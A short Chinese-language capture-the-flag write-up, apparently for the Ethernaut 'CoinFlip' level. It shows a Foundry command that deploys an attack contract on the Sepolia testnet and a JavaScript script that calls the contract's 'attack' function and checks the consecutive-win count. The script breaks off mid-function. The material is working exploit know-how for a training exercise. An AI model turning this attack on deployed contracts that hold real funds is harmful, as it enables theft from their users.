# 04 CoinFlip

### 1. 部署攻击合约

```bash
forge create src/04-CoinFlip/CoinFlipAttack.sol:CoinFlipAttack \
  --rpc-url $sepolia_rpc \
  --private-key $PRIVATE_KEY \
  --broadcast \
  --constructor-args $CoinFlip_ADDRESS
```

### 2. 运行攻击脚本
```
async function attackCoinFlip() {
    console.log('🎯 Starting CoinFlip Attack...\n')
    console.log(`Attack Contract: ${ATTACK_ADDRESS}`)
    console.log(`Target Contract: ${COINFLIP_ADDRESS}`)
    console.log(`Attacker: ${account.address}\n`)

      // 获取当前区块
      const currentBlock = await publicClient.getBlockNumber()
      console.log(`Current block: ${currentBlock}`)

      try {
        // 发起攻击
        const hash = await walletClient.writeContract({
          address: ATTACK_ADDRESS,
          abi: attackABI,
          functionName: 'attack'
        })

        console.log(`Transaction sent: ${hash}`)

        // 等待交易确认
        const receipt = await publicClient.waitForTransactionReceipt({ hash })
        console.log(`✅ Confirmed in block: ${receipt.blockNumber}`)

        // 检查当前连胜次数
        const wins = await publicClient.readContract({
          address: COINFLIP_ADDRESS,
          abi: coinFlipABI,
          functionName: 'consecutiveWins'
        })

        console.log(`Consecutive wins: ${wins}`)
        // 如果达到10，立即停止
```